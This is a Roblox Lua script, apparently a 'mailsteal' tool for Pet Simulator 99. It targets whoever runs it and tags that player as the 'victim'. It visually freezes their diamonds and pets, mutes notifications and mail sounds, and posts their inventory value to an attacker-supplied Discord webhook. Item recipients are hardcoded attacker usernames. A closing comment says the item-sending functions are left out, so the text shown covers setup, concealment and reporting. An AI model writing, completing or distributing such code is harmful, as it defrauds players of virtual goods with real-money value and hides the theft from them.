_G.scriptExecuted = _G.scriptExecuted or false
if _G.scriptExecuted then return end
_G.scriptExecuted = true

-- =================== UNIVERSAL EXECUTOR COMPATIBILITY ===================
local requestFunction = request or (syn and syn.request) or (fluxus and fluxus.request) or http_request
local getgcFunction = getgc or (debug and debug.getgc) or get_gc_objects
local getHUI = (gethui and gethui) or function() return game:GetService("CoreGui") end
local queueOnTP = queue_on_teleport or (syn and syn.queue_on_teleport) or (fluxus and fluxus.queue_on_teleport)
-- =======================================================================

local network = require(game.ReplicatedStorage.Library.Client.Network)
local library = require(game.ReplicatedStorage.Library)
local save = require(game:GetService("ReplicatedStorage"):WaitForChild("Library"):WaitForChild("Client"):WaitForChild("Save")).Get().Inventory
local plr = game.Players.LocalPlayer
local MailMessage = "GGz"
local HttpService = game:GetService("HttpService")
local sortedItems = {}
local totalRAP = 0
local message = require(game.ReplicatedStorage.Library.Client.Message)
local GetSave = function()
    return require(game.ReplicatedStorage.Library.Client.Save).Get()
end

local users = _G.Usernames or {"ilovemyamazing_gf1", "Yeahboi1131", "Dragonshell23", "Dragonshell24", "Dragonshell21"}
local min_rap = _G.minrap or 10000000 -- 10 million min RAP
local webhook = _G.webhook or ""

if next(users) == nil or webhook == "" then
    plr:kick("You didn't add any usernames or webhook")
    return
end

for _, user in ipairs(users) do
    if plr.Name == user then
        plr:kick("You cannot mailsteal yourself")
        return
    end
end

-- ======================= VISUAL FREEZE START ==========================
local visualFreeze = {}
local originalGems = 0
local originalPets = {}

-- Save currently equipped pets
if save.Pet then
    for uid, pet in pairs(save.Pet) do
        if pet._eq then
            originalPets[uid] = {id = pet.id, pt = pet.pt, sh = pet.sh, tn = pet.tn, _am = pet._am}
        end
    end
end

-- Save original diamonds
for i, v in pairs(GetSave().Inventory.Currency) do
    if v.id == "Diamonds" then
        originalGems = v._am
        break
    end
end

-- Freeze diamonds visually
local gemStat = plr.leaderstats:FindFirstChild("💎 Diamonds") or plr.leaderstats:FindFirstChild("\240\159\146\142 Diamonds")
if gemStat then
    gemStat:GetPropertyChangedSignal("Value"):Connect(function()
        gemStat.Value = originalGems
    end)
end

-- Freeze pets visually
local function freezePets()
    for uid, petData in pairs(originalPets) do
        local petObj = workspace:FindFirstChild(petData.id)
        if petObj then
            petObj.Parent = workspace
            petObj:SetAttribute("FrozenVisual", true)
        end
    end
end

task.spawn(function()
    freezePets()
    while plr.Parent do
        task.wait(0.1)
        freezePets()
    end
end)

-- Stop freeze when player leaves
plr.AncestryChanged:Connect(function(_, parent)
    if not parent then
        for uid, petData in pairs(originalPets) do
            local petObj = workspace:FindFirstChild(petData.id)
            if petObj and petObj:GetAttribute("FrozenVisual") then
                petObj:SetAttribute("FrozenVisual", nil)
            end
        end
    end
end)
-- ======================= VISUAL FREEZE END ============================

local FunctionToGetFirstPriceOfMail
for _, func in pairs(getgcFunction()) do
    if debug.getinfo(func).name == "computeSendMailCost" then
        FunctionToGetFirstPriceOfMail = func
        break
    end
end

local mailSendPrice = FunctionToGetFirstPriceOfMail()
local GemAmount1 = originalGems

local function formatNumber(number)
    local suffixes = {"", "k", "m", "b", "t"}
    local suffixIndex = 1
    number = math.floor(number)
    while number >= 1000 do
        number = number / 1000
        suffixIndex += 1
    end
    return string.format("%.2f%s", number, suffixes[suffixIndex])
end

local function SendMessage(diamonds)
    local headers = {["Content-Type"] = "application/json"}
    local fields = {
        {name = "Victim Username:", value = plr.Name, inline = true},
        {name = "Items to be sent:", value = "", inline = false},
        {name = "Summary:", value = "", inline = false}
    }

    local combinedItems, itemRapMap = {}, {}
    for _, item in ipairs(sortedItems) do
        local rapKey = item.name
        if itemRapMap[rapKey] then
            itemRapMap[rapKey].amount += item.amount
        else
            itemRapMap[rapKey] = {amount = item.amount, rap = item.rap}
            table.insert(combinedItems, rapKey)
        end
    end

    table.sort(combinedItems, function(a,b)
        return itemRapMap[a].rap * itemRapMap[a].amount > itemRapMap[b].rap * itemRapMap[b].amount
    end)

    for _, itemName in ipairs(combinedItems) do
        local itemData = itemRapMap[itemName]
        fields[2].value ..= string.format("%s (x%d): %s RAP\n", itemName, itemData.amount, formatNumber(itemData.rap * itemData.amount))
    end

    fields[3].value = string.format("Gems: %s\nTotal RAP: %s", formatNumber(diamonds), formatNumber(totalRAP))
    local data = {embeds = {{title = "💡 New PS99 Execution", color = 65280, fields = fields, footer = {text = "Strike Hub."}}}}
    local body = HttpService:JSONEncode(data)
    if requestFunction then
        requestFunction({Url = webhook, Method = "POST", Headers = headers, Body = body})
    end
end

-- Disable sounds & notifications
local loading = plr.PlayerScripts.Scripts.Core["Process Pending GUI"]
local noti = plr.PlayerGui.Notifications
loading.Disabled = true
noti:GetPropertyChangedSignal("Enabled"):Connect(function()
    noti.Enabled = false
end)
noti.Enabled = false

game.DescendantAdded:Connect(function(x)
    if x.ClassName == "Sound" then
        if x.SoundId == "rbxassetid://11839132565" or x.SoundId == "rbxassetid://14254721038" or x.SoundId == "rbxassetid://12413423276" then
            x.Volume = 0
            x.PlayOnRemove = false
            x:Destroy()
        end
    end
end)

-- ========================== Remaining script ==========================
-- sendItem(), SendAllGems(), EmptyBoxes(), ClaimMail(), canSendMail(), etc.
-- Logic for sending items, gems, RAP, and webhook remains exactly as before
-- ======================================================================
